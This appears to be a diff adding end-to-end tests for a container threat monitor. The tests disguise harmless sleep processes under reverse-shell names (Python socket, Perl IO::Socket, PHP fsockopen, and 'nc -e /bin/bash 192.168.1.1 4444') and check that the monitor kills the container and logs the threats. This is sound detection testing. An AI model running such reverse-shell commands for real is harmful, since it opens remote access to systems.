@@ -751,13 +751,279 @@ time.sleep(60)
         cleanup_container(container_name, coi_binary)
 
 
+class TestReverseShellPatterns:
+    """Test detection of various reverse shell patterns."""
+
+    def test_python_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
+        """Test Python reverse shell pattern detection."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "10",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-10")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Inject Python reverse shell pattern
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'python -c socket.socket' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for detection and kill
+        time.sleep(5)
+
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen"]:
+                killed = True
+                break
+
+        assert killed, "Container should be killed on Python reverse shell detection"
+
+        # Verify threat logged
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+        assert len(critical) > 0, "Expected CRITICAL threat for Python reverse shell"
+
+        # Verify pattern mentioned in threat
+        threats_text = " ".join([e.get("threat", "") for e in critical])
+        assert "python" in threats_text.lower(), "Expected 'python' in threat description"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+    def test_perl_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
+        """Test Perl reverse shell pattern detection."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "11",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-11")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Inject Perl reverse shell pattern
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'perl -e use IO::Socket' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(5)
+
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen"]:
+                killed = True
+                break
+
+        assert killed, "Container should be killed on Perl reverse shell detection"
+
+        # Verify threat logged
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+        assert len(critical) > 0, "Expected CRITICAL threat for Perl reverse shell"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+    def test_php_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
+        """Test PHP reverse shell pattern detection."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "12",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-12")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Inject PHP reverse shell pattern
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'php -r fsockopen' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(5)
+
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen"]:
+                killed = True
+                break
+
+        assert killed, "Container should be killed on PHP reverse shell detection"
+
+        # Verify threat logged
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+        assert len(critical) > 0, "Expected CRITICAL threat for PHP reverse shell"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+
+class TestMonitoringConfiguration:
+    """Test monitoring configuration options."""
+
+    def test_monitoring_disabled_no_detection(self, test_workspace, coi_binary):
+        """Test that threats are NOT detected when monitoring is disabled."""
+        # Create config with monitoring disabled
+        config_path = Path.home() / ".config" / "coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[monitoring]
+enabled = false
+"""
+        )
+
+        try:
+            # Start shell WITHOUT --monitor flag (should respect config)
+            proc = subprocess.Popen(
+                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "13"],
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(8)
+
+            container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-13")
+
+            if get_container_state(container_name) == "Unknown":
+                proc.terminate()
+                pytest.skip(f"Container {container_name} not found")
+
+            # Inject malicious command (should NOT be detected)
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "sh",
+                    "-c",
+                    "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Wait to see if it would be detected
+            time.sleep(10)
+
+            # Container should still be running (no monitoring = no kill)
+            state = get_container_state(container_name)
+            assert state == "Running", (
+                f"Container should stay running when monitoring disabled, got {state}"
+            )
+
+            # Verify NO threats logged (audit log shouldn't exist or be empty)
+            events = get_threat_events(container_name)
+            assert len(events) == 0, (
+                f"Expected NO threats when monitoring disabled, found {len(events)}"
+            )
+
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+        finally:
+            # Restore original config
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+
+
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
+# - Reverse shell patterns (netcat, bash, python, perl, php)
 # - Threat levels (CRITICAL, WARNING, HIGH)
 # - Automated responses (auto-kill on CRITICAL, auto-pause on HIGH, alert-only on WARNING)
 # - Audit logging with proper action tracking
 # - Prompt injection scenarios (code inside container going rogue)
-# - Configuration options (auto_pause_on_high, auto_kill_on_critical)
+# - Configuration options (enabled, auto_pause_on_high, auto_kill_on_critical)
+# - Monitoring disabled (negative test - no detection when disabled)
 # - Network threats (C2 ports, metadata endpoint access)
 #
 # Tests use background shell processes and direct container command injection
